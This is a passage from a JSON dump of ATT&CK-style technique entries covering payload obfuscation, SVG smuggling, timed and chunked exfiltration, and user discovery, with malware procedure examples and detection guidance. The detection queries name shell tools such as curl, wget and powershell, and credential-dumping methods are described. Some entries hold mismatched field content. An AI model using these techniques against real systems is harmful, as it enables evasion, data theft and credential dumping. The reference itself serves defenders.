      "PyDCrypthas been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase.[54]",
      "Raccoon Stealeruses RC4 encryption for strings and command and control addresses to evade static detection.[170][171][172]",
      "Raindropencrypted its payload using a simple XOR algorithm with a single-byte key.[173][174]",
      "RainyDayhas downloaded as a XOR-encrypted payload.[175]",
      "RansomHubhas an encrypted configuration file.[176]",
      "RAPIDPULSEhas the ability to RC4 encrypt and base64 encode decrypted files on compromised servers prior to writing them to stdout.[177]",
      "Reaverencrypts some of its files with XOR.[178]",
      "Mustang Pandastored installation payloads as encrypted files in hidden folders duringRedDelta Modified PlugX Infection Chain Operations.[179]",
      "ARedLeavesconfiguration file is encrypted with a simple XOR key, 0x53.[180]",
      "Remexiobfuscates its configuration data with XOR.[181]",
      "Some data inRemsecis encrypted using RC5 in CBC mode, AES-CBC with a hardcoded key, RC4, or Salsa20. Some data is also base64-encoded.[182][183]",
      "REvilhas used encrypted strings and configuration files.[184][185][186][187][188][189][190]",
      "Rifdoorhas encrypted strings with a single byte XOR algorithm.[94]",
      "Configuration data used byRising Sunhas been encrypted using an RC4 stream algorithm.[191]",
      "TheROADSWEEPbinary contains RC4 encrypted embedded scripts.[192][193][194]",
      "Sagerunexcan be passed a reference to an XOR-encrypted configuration file at runtime.[195]",
      "Saint Bearinitial payloads included encoded follow-on payloads located in the resources file of the first-stage loader.[196]",
      "Sakulauses single-byte XOR obfuscation to obfuscate many of its files.[197]",
      "SamSamhas been seen using AES or DES to encrypt payloads and payload components.[198][199]",
      "Seasaltobfuscates configuration data.[200]",
      "DuringShadowRay, threat actors used Base64-encrypted Python code to evade detection.[201]",
      "Sharkcan use encrypted and encoded files for C2 configuration.[140][202]",
      "Sidewinderhas used base64 encoding and ECDH-P256 encryption for payloads.[203][204][205]",
      "Skidmaphas encrypted it's main payload using 3DES.[206]",
      "Slivercan encrypt strings at compile time.[207][208]",
      "Smoke Loaderuses a simple one-byte XOR method to obfuscate values in the malware.[209][210]",
      "SocGholishhas single or double Base-64 encoded references to its second-stage server URLs.[211]",
      "SpeakUpencodes its second-stage payload with Base64.[212]",
      "Squirrelwafflehas been obfuscated with a XOR-based algorithm.[213][214]",
      "STARWHALEhas been obfuscated with hex-encoded strings.[215]",
      "StealBitstores obfuscated DLL file names in its executable.[216]",
      "StoneDrillhas obfuscated its module with an alphabet-based table or XOR encryption.[217]",
      "Storm-1811XOR encodes aCobalt Strikeinstallation payload in a DLL file that is decoded with a hardcoded key when called by a legitimate 7zip installation process.[218]",
      "StrelaStealeruses XOR-encoded strings to obfuscate items.[219]",
      "StrongPityhas used encrypted strings in its dropper component.[220][221]",
      "Stuxnetuses encrypted configuration blocks and writes encrypted files to disk.[222]",
      "SUPERNOVAcontained Base64-encoded strings.[223]",
      "SysUpdatecan encrypt and encode its configuration file.[224]",
      "TA2541has used compressed and char-encoded scripts in operations.[225]",
      "TA505has password-protected malicious Word documents.[226]",
      "Taidoorcan use encrypted string blocks for obfuscation.[227]",
      "TeamTNThas encrypted its binaries via AES and encoded files using Base64.[228][229]",
      "AThreat Group-3390tool can encrypt payloads using XOR.Threat Group-3390malware is also obfuscated using Metasploit’s shikata_ga_nai encoder.[230][231][232]",
      "ThreatNeedlehas been compressed and obfuscated using RC4, AES, or XOR.[233]",
      "TINYTYPHONhas used XOR with 0x90 to obfuscate its configuration file.[234]",
      "Torismahas been Base64 encoded and AES encrypted.[160]",
      "Transparent Tribehas dropped encoded executables on compromised hosts.[235]",
      "TrickBotuses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.[236]",
      "Tropic Trooperhas encrypted configuration files.[237][238]",
      "APIs and strings in someTYPEFRAMEvariants are RC4 encrypted. Another variant is encoded with XOR.[239]",
      "UPSTYLEstores primary content as base64-encoded objects.[240][241]",
      "Uroburoscan use AES and CAST-128 encryption to obfuscate resources.[242]",
      "Ursnifhas used an XOR-based algorithm to encrypt Tor clients dropped to disk.[243]Ursnifdroppers have also been delivered as password-protected zip files that execute base64 encodedPowerShellcommands.[244]",
      "Most strings inUSBStealerare encrypted using 3DES and XOR and reversed.[245]",
      "VERMINis obfuscated using the obfuscation tool called ConfuserEx.[246]",
      "VersaMemencrypted captured credentials with AES then Base64 encoded them before writing to local storage.[247]",
      "AVolgmervariant is encoded using a simple XOR cipher.[248]",
      "TheWastedLockerpayload includes encrypted strings stored within the .bss section of the binary file.[249]",
      "Waterbearhas used RC4 encrypted shellcode and encrypted functions.[250]",
      "WhisperGatecan Base64 encode strings, store downloaded files in reverse byte order,  and use the Eazfuscator tool to obfuscate its third stage.[251][252][253]",
      "Whiteflyhas encrypted the payload used for C2.[254]",
      "WindTailcan be delivered as a compressed, encrypted, and encoded payload.[255]",
      "Winnti for Linuxcan encode its configuration file with single-byte XOR encoding.[256]",
      "Winnti for Windowshas the ability to encrypt and compress its payload.[257]",
      "Woody RAThas used Base64 encoded strings and scripts.[258]",
      "OlderXCSSETvariants usexxdto encode modules. Later versions pass anxxdorbase64encoded blob through multiple decoding stages to reconstruct the module name, AppleScript, or shell command. For example, the initial network request uses three layers of hex decoding before executing a curl command in a shell.[259]",
      "XLoaderfeatures encrypted functions using the RC4 algorithm and bytecode operations.[260][261]",
      "YAHOYAHencrypts its configuration file using a simple algorithm.[262]",
      "ZeroThas encrypted its payload with RC4.[263]",
      "Zeus Pandaencrypts strings with XOR.Zeus Pandaalso encrypts all configuration and settings in AES and RC4.[264][265]",
      "Zoxhas been encoded with Base64.[266]",
      "ZxxZhas been encoded to avoid detection from static analysis tools.[267]"
    ]
  },
  "T1027.014": {
    "Name": "Obfuscated Files or Information:Polymorphic Code",
    "Description": "Adversaries may utilize polymorphic code (also known as metamorphic or mutating code) to evade detection. Polymorphic code is a type of software capable of changing its runtime footprint during code execution.[1]With each execution of the software, the code is mutated into a different version of itself that achieves the same purpose or objective as the original. This functionality enables the malware to evade traditional signature-based defenses, such as antivirus and antimalware tools.[2]Other obfuscation techniques can be used in conjunction with polymorphic code to accomplish the intended effects, including using mutation engines to conduct actions such asSoftware Packing,Command Obfuscation, orEncrypted/Encoded File.[3][4]",
    "Detects": [
      "The initial detection of a malicious tool or anomalous behavior may trigger an anti-virus or other security tool alert, and may be one of the only indications received before the code is able to mutate and evade the same type of detection. The alerting system should be thoroughly investigated beyond the initial alert for activity that may not have been detected.",
      "Monitor for files with large entropy which don’t match what is normal/expected given the file type and location.",
      "Monitor for and analyze files which contain content with large entropy, as this may indicate potentially malicious compressed or encrypted data."
    ],
    "Procedure Examples": [
      "BendyBear changes its runtime footprint during code execution to evade signature-based defenses.[5]"
    ]
  },
  "T1027.015": {
    "Name": "Obfuscated Files or Information:Compression",
    "Description": "Adversaries may use compression to obfuscate their payloads or files. Compressed file formats such as ZIP, gzip, 7z, and RAR can compress and archive multiple files together to make it easier and faster to transfer files. In addition to compressing files, adversaries may also compress shellcode directly - for example, in order to store it in a Windows Registry key (i.e.,Fileless Storage).[1]In order to further evade detection, adversaries may combine multiple ZIP files into one archive. This process of concatenation creates an archive that appears to be a single archive but in fact contains the central directories of the embedded archives. Some ZIP readers, such as 7zip, may not be able to identify concatenated ZIP files and miss the presence of the malicious payload.[2]File archives may be sent as oneSpearphishing Attachmentthrough email. Adversaries have sent malicious payloads as archived files to encourage the user to interact with and extract the malicious payload onto their system (i.e.,Malicious File).[3]However, some file compression tools, such as 7zip, can be used to produce self-extracting archives. Adversaries may send self-extracting archives to hide the functionality of their payload and launch it without requiring multiple actions from the user.[4]Compressionmay be used in combination withEncrypted/Encoded Filewhere compressed files are encrypted and password-protected.",
    "Detects": [
      "Monitor for files with large entropy which don’t match what is normal/expected given the file type and location.",
      "Monitor data about archive files, such as the signatures and the filenames inside of ZIP archives. Files which contain content with large entropy may indicate potentially malicious compressed data."
    ],
    "Procedure Examples": [
      "BADHATCHcan be compressed with the ApLib algorithm.[5]",
      "DarkWatchmanhas been delivered as compressed RAR payloads in ZIP files to victims.[6]",
      "Donutcan generate encrypted, compressed/encoded, or otherwise obfuscated code modules.[7]",
      "Gelsemiumhas the ability to compress its components.[8]",
      "Hancitorhas delivered compressed payloads in ZIP files to victims.[9]",
      "HermeticWipercan compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.[10][11][12]",
      "Higaisaused Base64 encoded compressed payloads.[13][14]",
      "Kerrdowncan encrypt, encode, and compress multiple layers of shellcode.[15]",
      "Leviathanhas obfuscated code using gzip compression.[16]",
      "Line Runneruses a ZIP payload that is automatically extracted with its contents, a LUA script, executed for initial execution via CVE-2024-20359.[17]",
      "Mofanghas compressed theShimRatexecutable within malicious email attachments.[18]",
      "Moleratshas delivered compressed executables within ZIP files to victims.[19]",
      "Ninjahas compressed its data with the LZSS algorithm.[20][21]",
      "Pandorahas the ability to compress stings with QuickLZ.[22]",
      "PcSharehas been compressed with LZW algorithm.[23]",
      "Pillowminthas been compressed and stored within a registry key.[1]",
      "Ponyattachments have been delivered via compressed archive files.[24]",
      "RCSessioncan compress and obfuscate its strings to evade detection on a compromised host.[25]",
      "RTMhas been delivered to targets as various archive files including ZIP, 7-ZIP, and RAR.[26][27]",
      "Samuraican deliver its final payload as a compressed, encrypted and base64-encoded blob.[20]",
      "ShimRathas been delivered as a package that includes compressed DLL and shellcode payloads within a .dat file.[18]",
      "TheSocGholishJavaScript payload has been delivered within a compressed ZIP archive.[28][29]",
      "StrelaStealerhas been delivered via JScript files in a ZIP archive.[30][31]",
      "SUNBURSTstrings were compressed and encoded in Base64.[32]",
      "TA2541has used compressed and char-encoded scripts in operations.[33]",
      "Threat Group-3390malware is compressed with LZNT1 compression.[34][35][36]",
      "ThreatNeedlehas been compressed and obfuscated.[37]",
      "WindTailcan be delivered as a compressed, encrypted, and encoded payload.[38]",
      "Winnti for Windowshas the ability to encrypt and compress its payload.[39]"
    ]
  },
  "T1027.016": {
    "Name": "Obfuscated Files or Information:Junk Code Insertion",
    "Description": "Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined withCompressionorSoftware Packing.[1][2]No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.[1]The use of junk / dead code insertion is distinct fromBinary Paddingbecause the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.",
    "Detects": [
      "When executed, the resulting process from files containing dead code may exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file."
    ],
    "Procedure Examples": [
      "APT32includes garbage code to mislead anti-malware software and researchers.[3][4]",
      "CORESHELLcontains unused machine instructions in a likely attempt to hinder analysis.[5]",
      "FatDukehas been packed with junk code and strings.[6]",
      "FIN7has used random junk code to obfuscate malware code.[7]",
      "FinFishercontains junk code in its functions in an effort to confuse disassembly programs.[8][9]",
      "Gamaredon Grouphas obfuscated .NET executables by inserting junk code.[10]",
      "Gelsemiumcan use junk code to hide functions and evade detection.[11]",
      "Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis.[12]",
      "Mazehas inserted large blocks of junk code, including some components to decrypt strings and other important information for later in the encryption process.[13]",
      "Mustang Pandahas used junk code within their DLL files to hinder analysis.[14]",
      "Ponyobfuscates memory flow by adding junk instructions when executing to make analysis more difficult.[15]",
      "POWERSTATShas used useless code blocks to counter analysis.[16]",
      "SamSamhas used garbage code to pad some of its malware components.[17]",
      "StrelaStealervariants have included excessive mathematical functions padding the binary and slowing execution for anti-analysis and sandbox evasion purposes.[18]",
      "WastedLockercontains junk code to increase its entropy and hide the actual code.[19]",
      "A version ofXTunnelintroduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.[20]",
      "ytycontains junk code in its binary, likely to confuse malware analysts.[21]",
      "ZeroThas obfuscated DLLs and functions using dummy API calls inserted between real instructions.[22]"
    ]
  },
  "T1027.017": {
    "Name": "Obfuscated Files or Information:SVG Smuggling",
    "Description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.[1]SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include<script>tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files.SVG smuggling can take a number of forms. For example, threat actors may include content that:Assembles malicious payloads[2]Downloads malicious payloads[3]Redirects users to malicious websites[4]Displays interactive content to users, such as fake login forms and download buttons.[4]SVG Smuggling may be used in conjunction withHTML Smugglingwhere an SVG with a malicious payload is included inside an HTML file.[2]SVGs may also be included in other types of documents, such as PDFs.",
    "Detects": [
      "Monitor for newly constructed files via JavaScript. Developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging. Consider monitoring files downloaded from the Internet, possibly by SVG Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.SVG Smuggling is often chained:.svg downloaded → parsed or executed by browser/email clientDrops or references a secondary payload (HTML/JS/Payload)Follow-on execution with powershell, cmd, wscript, etc.Analytic 1 - Detect malicious use of SVG files embedded with script tags to assemble, download, or redirect to payloads.index=(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" OR sourcetype=\"linux_audit\" OR sourcetype=\"osquery\")(file_name=\".svg\" OR file_path=\"\\Downloads\\.svg\" OR file_path=\"/tmp/.svg\" OR file_path=\"/Users//Downloads/.svg\")| join type=inner file_path [  search index=process_name IN (\"powershell.exe\", \"wscript.exe\", \"cmd.exe\", \"mshta.exe\", \"bash\", \"curl\", \"wget\")  | stats min(_time) as proc_time by file_path, process_name, host]| eval time_diff=proc_time - _time| where time_diff >= 0 AND time_diff < 120| table _time, host, user, file_path, file_name, process_name, command_line, time_diff| sort _timeAnalytic 2 - Suspicious JavaScript or Obfuscation in SVGfile_name=\".svg\"| rex field=_raw \"\"| search js_payload=\"eval\" OR js_payload=\"atob\" OR js_payload=\"window.location\" OR js_payload=\"document.write\"| table _time, file_name, js_payload"
    ],
    "Procedure Examples": [
      "Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist."
    ]
  },
  "T1029": {
    "Name": "Scheduled Transfer",
    "Description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such asExfiltration Over C2 ChannelorExfiltration Over Alternative Protocol.",
    "Detects": [
      "Monitor for repeated outbound connections to the same destination at scheduled intervals, connections from processes that typically do not initiate network communications, transfers using non-standard ports or unexpected encryption methods.Analytic 1 - Detecting Recurring Network Connections for Exfiltration(EventCode=3)OR (source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (dest_ip IN (suspicious_ip_list) OR bytes_out > 5000000)| bucket span=1h _time| stats count by _time, host, process, dest_ip, bytes_out| where count > 3| stats count by host, dest_ip, count, earliest(_time), latest(_time)| where count >= 3| eval risk_score=case(    count >= 5, 9,    count = 3 OR 4, 7)| where risk_score >= 7| table host, dest_ip, count, earliest, latest, risk_score",
      "Monitor for network traffic originating from unknown/unexpected hardware devices. Local network traffic metadata (such as source MAC addressing) as well as usage of network management protocols such as DHCP may be helpful in identifying hardware.Analytic 1 - Detecting High Volume Exfiltration at Specific Intervals(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (bytes_out > 10000000)| bucket span=1h _time| stats sum(bytes_out) as total_bytes by _time, host, dest_ip| where total_bytes > 100000000| stats count by host, dest_ip, total_bytes, earliest(_time), latest(_time)| where count >= 3| eval risk_score=case(    total_bytes > 500000000, 9,    total_bytes > 100000000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, earliest, latest, risk_score"
    ],
    "Procedure Examples": [
      "ADVSTORESHELLcollects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.[1]",
      "Chrommmecan set itself to sleep before requesting a new command from C2.[2]",
      "Cobalt Strikecan set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.[3]",
      "ComRAThas been programmed to sleep outside local business hours (9 to 5, Monday to Friday).[4]",
      "Dipsindcan be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.[5]",
      "Flagprohas the ability to wait for a specified time interval between communicating with and executing commands from C2.[6]",
      "Higaisasent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.[7]",
      "jRATcan be configured to reconnect at certain intervals.[8]",
      "Kazuarcan sleep for a specific time and be set to communicate at specific intervals.[9]",
      "LightNeuroncan be configured to exfiltrate data during nighttime or working hours.[10]",
      "Linfocreates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.[11]",
      "Machetesends stolen data to the C2 server every 10 minutes.[12]",
      "Ninjacan configure its agent to work only in specific time frames.[13]",
      "POWERSTATScan sleep for a given number of seconds.[14]",
      "ShadowPadhas sent data back to C2 every 8 hours.[15]",
      "Sharkcan pause C2 communications for a specified time.[16]",
      "ShimRatcan sleep when instructed to do so by the C2.[17]",
      "TinyTurlacontacts its C2 based on a scheduled timing set in its configuration.[18]"
    ]
  },
  "T1030": {
    "Name": "Data Transfer Size Limits",
    "Description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "Detects": [
      "Monitor for processes that initiate persistent outbound connections with steady data transfer, multiple small-sized data transfers within a short timeframe to external destinations, network connections originating from unexpected processes or unauthorized ports, or repeated use of the same destination for outbound traffic across multiple sessions.Analytic 1 - Detecting Repeated Small-Size Data Transfers(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (bytes_out > 100 AND bytes_out < 50000)  // Detects small packet sizes| bucket span=5m _time| stats count by _time, host, process, dest_ip, bytes_out| where count > 10  // Ensures frequent occurrence| stats count by host, dest_ip, count, earliest(_time), latest(_time)| where count >= 10| eval risk_score=case(    count >= 20, 9,    count >= 10, 8)| where risk_score >= 8| table host, dest_ip, count, earliest, latest, risk_score",
      "Monitor and analyze traffic flows that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, or gratuitous or anomalous traffic patterns). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).Analytic 1 - Detecting Timed Small-Sized Data Transfers for Exfiltration(EventCode=3 OR source=\"zeek_conn.log\" OR source=\"firewall_logs\")| where (bytes_out > 100 AND bytes_out < 50000)| bucket span=10m _time| stats count, sum(bytes_out) as total_bytes by _time, host, dest_ip| where count > 5  // Ensures repeated transfers within 10-minute intervals| stats count by host, dest_ip, total_bytes, earliest(_time), latest(_time)| where count >= 5| eval risk_score=case(    total_bytes > 500000, 9,    total_bytes > 100000, 8)| where risk_score >= 8| table host, dest_ip, total_bytes, earliest, latest, risk_score"
    ],
    "Procedure Examples": [
      "AppleSeedhas divided files if the size is 0x1000000 bytes or more.[1]",
      "APT28has split archived exfiltration files into chunks smaller than 1MB.[2]",
      "APT41transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.[3]",
      "DuringC0015, the threat actors limitedRclone's bandwidth setting during exfiltration.[4]",
      "DuringC0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.[5]",
      "Carbanakexfiltrates data in compressed chunks if a message is larger than 4096 bytes .[6]",
      "Cobalt Strikewill break large data sets into smaller chunks for exfiltration.[7]",
      "Helminthsplits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.[8]",
      "Kesselcan split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.[9]",
      "Kevincan exfiltrate data to the C2 server in 27-character chunks.[10]",
      "LuminousMothhas split archived files into multiple parts to bypass a 5MB limit.[11]",
      "LunarWebcan split exfiltrated data that exceeds 1.33 MB in size into multiple random sized parts between 384 and 512 KB.[12]",
      "Mythicsupports custom chunk sizes used to upload/download files.[13]",
      "ObliqueRATcan break large files of interest into smaller chunks to prepare them for exfiltration.[14]",
      "OopsIEexfiltrates command output and collected files to its C2 server in 1500-byte blocks.[15]",
      "Playhas split victims' files into chunks for exfiltration.[16][17]",
      "POSHSPYuploads data in 2048-byte chunks.[18]",
      "TheRclone\"chunker\" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.[19][4]",
      "RDATcan upload a file via HTTP POST response to the C2 split into 102,400-byte portions.RDATcan also download data from the C2 which is split into 81,920-byte portions.[20]",
      "StealBitcan be configured to exfiltrate files at a specified rate to evade network detection mechanisms.[21]",
      "Threat Group-3390actors have split RAR files for exfiltration into parts.[22]"
    ]
  },
  "T1033": {
    "Name": "System Owner/User Discovery",
    "Description": "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by usingOS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information fromSystem Owner/User Discoveryduring automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, includingwhoami. In macOS and Linux, the currently logged in user can be identified withwandwho. On macOS thedscl . list /Users | grep -v '_'command can also be used to enumerate user accounts. Environment variables, such as%USERNAME%and$USER, may also be used to access this information.On network devices,Network Device CLIcommands such asshow usersandshow sshcan be used to display users currently logged into the device.[1][2]",
    "Detects": [
      "Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.[240][241][242]Note: Domain controllers may not log replication requests originating from the default domain controller account.[243]. Monitor for replication requests[244]from IPs not associated with known domain controllers.[245]",
      "Monitor executed commands and arguments that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Look for command-lines that invoke AuditD or the Security Accounts Manager (SAM). Remote access tools may contain built-in features or incorporate existing tools likeMimikatz.PowerShellscripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,[246]which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Note: Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on abuse of CMSTP.",
      "Monitor for hash dumpers opening the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM). Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromisedValid Accountsin-use by adversaries may help as well.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).Note: Network Analysis frameworks such as Zeek can be used to capture, decode, and alert on network protocols.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
      "Monitor for API calls that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.",
      "Monitor for unexpected processes interacting with lsass.exe.[247]Common credential dumpers such asMimikatzaccess the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflectiveProcess Injectionto reduce potential indicators of malicious activity.LinuxTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path/proc/<pid>/maps, where the<pid>directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.",
      "Monitor for newly executed processes that may be indicative of credential dumping. On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). The Analytic looks for any instances ofatbeing created, therefore implying the querying or creation of tasks. If this tools is commonly used in your environment (e.g., by system administrators) this may lead to false positives and this analytic will therefore require tuning.Analytic 1 - Suspicious Process Execution(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (sourcetype=\"WinEventLog:Security\" EventCode=\"4688\") AND Image=\"*at.exe\"",
      "Monitor for the SAM registry key being accessed that may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software."
    ],
    "Procedure Examples": [
      "Action RAThas the ability to collect the username from an infected host.[3]",
      "Agent Teslacan collect the username from the victim’s machine.[4][5][6]",
      "Agent.btzobtains the victim username and saves it to a file.[7]",
      "Amadeyhas collected the user name from a compromised host usingGetUserNameA.[8]",
      "APT19used an HTTP malware variant and a Port 22 malware variant to collect the victim’s username.[9]",
      "AnAPT3downloader uses the Windows command\"cmd.exe\" /C whoamito verify that it is running with the elevated privileges of \"System.\"[10]",
      "APT32collected the victim's username and executed thewhoamicommand on the victim's machine.APT32executed shellcode to collect the username on the victim's machine.[11][12][13]",
      "APT37identifies the victim username.[14]",
      "APT38has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users.[15]",
      "APT39usedRemexito collect usernames from the system.[16]",
      "APT41has executedwhoamicommands, including using the WMIEXEC utility to execute this on remote machines.[17][18]",
      "Aquatic Pandagathers information on recently logged-in users on victim devices.[19]",
      "Aria-bodyhas the ability to identify the username on a compromised host.[20]",
      "AsyncRATcan check if the current user of a compromised system is an administrator.[21]",
      "AuTo Stealerhas the ability to collect the username from an infected host.[3]",
      "Azorultcan collect the username from the victim’s machine.[22]",
      "BabySharkhas executed thewhoamicommand.[23]",
      "Backdoor.Oldreacollects the current username from the victim.[24]",
      "BADHATCHcan obtain logged user information from a compromised machine and can execute the commandwhoami.exe.[25]",
      "Bazarcan identify the username of the infected user.[26]",
      "BISCUIThas a command to gather the username from the system.[27]",
      "BlackCatcan utilizenet usecommands to discover the user name on a compromised host.[28]",
      "BloodHoundcan collect information on user sessions.[29]",
      "BLUELIGHTcan collect the username on a compromised host.[30]",
      "Bonadanhas discovered the username of the user running the backdoor.[31]",
      "BoomBoxcan enumerate the username on a compromised host.[32]",
      "Bumblebeehas the ability to identify the user name.[33]",
      "DuringC0017,APT41usedwhoamito gather information from victim machines.[34]",
      "DuringC0018, the threat actors collectedwhoamiinformation via PowerShell scripts.[35]",
      "Cannoncan gather the username from the system.[36]",
      "Cardinal RATcan collect the username from a victim machine.[37]",
      "Caterpillar WebShellcan obtain a list of user accounts from a victim's machine.[38]",
      "Chaeshas collected the username and UID from the infected machine.[39]",
      "Chimerahas used thequsercommand to show currently logged on users.[40]",
      "CHIMNEYSWEEPhas included the victim's computer name and username in C2 messages sent to actor-owned infrastructure.[41]",
      "Chrommmecan retrieve the username from a targeted system.[42]",
      "Clamblingcan identify the username on a compromised host.[43][44]",
      "CreepySnailcan executegetUsernameon compromised systems.[45]",
      "Crimsoncan identify the user on a targeted system.[46][47][48]",
      "Cryptoisticcan gather data on the user of a compromised host.[49]",
      "Cuckoo Stealercan discover and send the username from a compromised host to C2.[50]",
      "DarkCometgathers the username from the victim’s machine.[51]",
      "DarkWatchmanhas collected the username from a victim machine.[52]",
      "Denisenumerates and collects the username from the victim’s machine.[53][13]",
      "A Linux version ofDerusbichecks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.Derusbialso gathers the username of the victim.[54]",
      "Diavolcan collect the username from a compromised host.[55]",
      "DnsSystemcan use the Windows user name to create a unique identification for infected users and systems.[56]",
      "DownPapercollects the victim username and sends it to the C2 server.[57]",
      "Dragonflyused the commandquery useron victim hosts.[58]",
      "DRATzaruscan obtain a list of users from an infected machine.[59]",
      "Dyrehas the ability to identify the users on a compromised host.[60]",
      "Earth Luscacollected information on user accounts via thewhoamicommand.[61]",
      "Egregorhas used tools to gather information about users.[62]",
      "Emotethas enumerated all users connected to network shares.",
      "Empirecan enumerate the username on targeted hosts.[63]",
      "Epiccollects the user name from the victim’s machine.[64]",
      "EVILNUMcan obtain the username from the victim's machine.[65]",
      "Exaramel for Linuxcan runwhoamito identify the system owner.[66]",
      "Explosivehas collected the username from the infected host.[67]",
      "Felismuscollects the current username and sends it to the C2 server.[68]",
      "FELIXROOTcollects the username from the victim’s machine.[69][70]",
      "FIN10has used Meterpreter to enumerate users on remote systems.[71]",
      "FIN7has used the commandcmd.exe /C quserto collect user session information.[72]",
      "FIN8has executed the commandquserto display the session details of a compromised machine.[73]",
      "Flagprohas been used to run thewhoamicommand on the system.[74]",
      "FlawedAmmyyenumerates the current user during the initial infection.[75][76]",
      "DuringFrankenstein, the threat actors usedEmpireto enumerate hosts and gather username, machine name, and administrative permissions information.[63]",
      "FunnyDreamhas the ability to gather user information from the targeted system usingwhoami/upn&whoami/fqdn&whoami/logonid&whoami/all.[77]",
      "GALLIUMusedwhoamiandquery userto obtain information about the victim user.[78]",
      "AGamaredon Groupfile stealer can gather the victim's username to send to a C2 server.[79]",
      "Gazerobtains the current user's security identifier.[80]",
      "Gelsemiumhas the ability to distinguish between a standard user and an administrator on a compromised host.[42]",
      "Get2has the ability to identify the current username of an infected host.[81]",
      "Gold Dragoncollects the endpoint victim's username and uses it as a basis for downloading additional components from the C2 server.[82]",
      "Goopyhas the ability to enumerate the infected system's user name.[13]",
      "Grandoreirocan collect the username from the victim's machine.[83]",
      "GravityRATcollects the victim username along with other account information (account type, description, full name, SID and status).[84]",
      "GrimAgentcan identify the user id on a target machine.[85]",
